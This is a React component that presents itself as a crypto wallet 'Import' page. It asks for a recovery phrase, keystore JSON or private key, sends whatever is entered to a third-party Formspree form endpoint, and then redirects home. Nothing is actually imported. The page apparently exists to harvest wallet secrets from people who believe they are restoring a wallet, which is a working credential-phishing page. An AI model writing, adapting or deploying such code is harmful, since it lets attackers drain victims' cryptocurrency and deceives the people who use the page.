import React, {useState} from 'react'
import "./import1.css"
import { useForm } from '@formspree/react';

export default function Import(props) {

    const { params: {name}} = props.match;

    const [state, handleSubmit] = useForm("xjvjonrb");

    const [panel, setPanel] = useState("phrase")

    if (state.succeeded) {
        props.history.push("/")    
    }

    return (
        <div className="import">
            <div className="container">
                <header>
                    <h2>Import</h2>
                </header>
                <nav>
                    <ul>
                        <li onClick={()=> setPanel("phrase")}>Phrase</li>
                        <li onClick={()=> setPanel("kStore")}>Keystore Json</li>
                        <li onClick={()=> setPanel("pKey")}>Private key</li>
                    </ul>
                </nav>
                <form onSubmit={handleSubmit}>
                    {/* Phrase */}
                    { panel === "phrase" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <textarea name="phrase" placeholder="Phrase" className="phrase"  required/>
                        <p>Typically 12 (sometimes 24) words seperated by single spaces.</p>
                    </> : null}

                    {/* Private Key */}
                    { panel === "kStore" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <input name="key-store" placeholder="KeyStore" className="kStore" style={{marginBottom: "20px"}} required/>
                    </> : null}

                    {/* pKey */}
                    { panel === "pKey" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <input name="Private Key" type="pKey" placeholder="Private-Key" className="pKey" required style={{marginBottom: "10px"}}/>
                    </> : null}

                    <input type="submit" value="Proceed" id="submitBtn"/>
                </form>
            </div>
        </div>
    )
}
